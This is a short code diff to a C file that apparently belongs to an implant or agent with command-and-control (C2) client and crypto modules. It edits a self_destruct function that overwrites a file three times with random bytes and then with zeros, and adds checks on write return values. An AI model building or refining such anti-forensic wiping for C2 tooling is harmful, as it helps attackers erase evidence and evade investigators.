@@ -25,7 +25,6 @@
  * ============================================================================
  */
 
-#define _GNU_SOURCE
 #include "../c2_comms/c2_client.h"
 #include "../c2_comms/crypto.h"
 #include "../common/config.h"
@@ -80,14 +79,18 @@ static void self_destruct(void) {
     for (int pass = 0; pass < 3; pass++) {
       aegis_random_bytes(randbuf, st.st_size);
       lseek(fd, 0, SEEK_SET);
-      write(fd, randbuf, st.st_size);
+      if (write(fd, randbuf, st.st_size) != (ssize_t)st.st_size) {
+        /* Ignore write error during wipe */
+      }
       fsync(fd);
     }
 
     /* Final zero pass */
     memset(randbuf, 0, st.st_size);
     lseek(fd, 0, SEEK_SET);
-    write(fd, randbuf, st.st_size);
+    if (write(fd, randbuf, st.st_size) != (ssize_t)st.st_size) {
+      /* Ignore write error during wipe */
+    }
     fsync(fd);
 
     free(randbuf);
